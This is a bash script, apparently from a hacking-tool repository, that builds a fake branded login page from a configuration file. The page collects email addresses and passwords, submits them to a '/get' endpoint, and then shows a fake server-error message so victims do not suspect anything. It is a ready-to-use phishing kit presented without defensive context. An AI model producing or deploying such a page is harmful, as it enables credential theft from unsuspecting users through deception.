#1 By FlippieHacks - https://github.com/FlippieHacks
#!/bin/bash
mapfile -t <./../config.txt;

background_color=${MAPFILE[0]:30}
company_title_text=${MAPFILE[1]:30}
company_title_color=${MAPFILE[2]:30}
container_background_color=${MAPFILE[3]:30}
container_title_text=${MAPFILE[4]:30}
container_title_color=${MAPFILE[5]:30}
container_subtitle_text=${MAPFILE[6]:30}
container_subtitle_color=${MAPFILE[7]:30}
submit_btn_background_color=${MAPFILE[8]:30}
submit_btn_text=${MAPFILE[9]:30}
submit_btn_text_color=${MAPFILE[10]:30}
forgot_credentials=${MAPFILE[11]:30}
forgot_credentials_text=${MAPFILE[12]:30}
forgot_credentials_color=${MAPFILE[13]:30}

if [ -f './../index.html' ] ; then
    rm './../index.html'
fi

#1 Generate Html
cat <<- EOF >> ./../index.html
<!DOCTYPE html><html><head><style>a:hover {text-decoration: underline;} body {font-family: Arial, sans-serif;align-items: center;justify-content: center;
EOF
echo "background-color: ${background_color};" >> ./../index.html;

cat <<- EOF >> ./../index.html
} input[type="text"], input[type="password"] {width: 100%;padding: 12px 10px;margin: 8px 0;box-sizing: border-box;border: 1px solid #cccccc;border-radius: 4px;} .container {max-width: 33%;margin: auto;padding: 20px;} .logo-container {text-align: center;margin-bottom: 30px;display: flex;justify-content: center;align-items: center;} .logo {width: 40px;height: 40px;fill: #FFC72C;margin-right: 100px} .company-name {font-size: 42px;
EOF

echo "color: ${company_title_color};" >> ./../index.html;

cat <<- EOF >> ./../index.html
margin-left: 0px;} .form-container {
EOF

echo "background: ${container_background_color};" >> ./../index.html;

cat <<- EOF >> ./../index.html
border: 1px solid #CEC0DE;border-radius: 4px;padding: 20px;box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);} h1 {text-align: center;font-size: 28px;font-weight: 500;margin-bottom: 20px;} .input-field {width: 100%;padding: 12px;border: 1px solid #BEABD3;border-radius: 4px;margin-bottom: 20px;font-size: 14px;} .submit-btn {
EOF

echo "background: ${submit_btn_background_color};" >> ./../index.html;
echo "color: ${submit_btn_text_color};" >> ./../index.html;

cat <<- EOF >> ./../index.html
border: none;padding: 12px 20px;border-radius: 4px;font-size: 16px;} .submit-btn:hover {background: #5B3784;}
EOF
echo ".containersubtitle {" >> ./../index.html;
echo "color : ${container_subtitle_color}" >> ./../index.html;
echo "} .containertitle {" >> ./../index.html;
echo "color : ${container_title_color}" >> ./../index.html;
cat <<- EOF >> ./../index.html
}</style></head><body><div class="container"><div class="logo-container">
EOF

echo "$(cat ./../svg.txt)" >> ./../index.html;
echo "<div class="company-name">" >> ./../index.html;
echo "${company_title_text}" >> ./../index.html;
echo "</div>" >> ./../index.html;
echo "</div><div class="form-container"><center><h1 class='containertitle'>${container_title_text}</h2>" >> ./../index.html;
echo "<h2 class='containersubtitle'>${container_subtitle_text}</h2>" >> ./../index.html;

cat <<- EOF >> ./../index.html
</center>
<form action="/get" id="login-form"><input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required><input name="password" class="input-field" type="password" placeholder="Password" required>
EOF

echo "<button id="submitbtn" class="submit-btn" type="submit">${submit_btn_text}</button>" >> ./../index.html;
if [ forgot_credentials ] ; then
    echo "<a id='forgot_credentials' style='color: ${forgot_credentials_color};'>${forgot_credentials_text}</a>" >> ./../index.html
fi
#1 Generate Response Html
cat <<- EOF >> ./../index.html
</form></div></div>
<script>function showErrorPage() {document.write("<div style='margin-top:10%;background: lightgrey;max-width: 33%;margin: auto;padding: 20px;'><h1 style='text-align: center;color: black'>Our servers seem to be having some difficulties<h1></div>");}document.getElementById("submitbtn").addEventListener("click", showErrorPage);document.getElementById("forgot_credentials").addEventListener("click", showErrorPage);
</script></body></html>
EOF

start ./../index.html;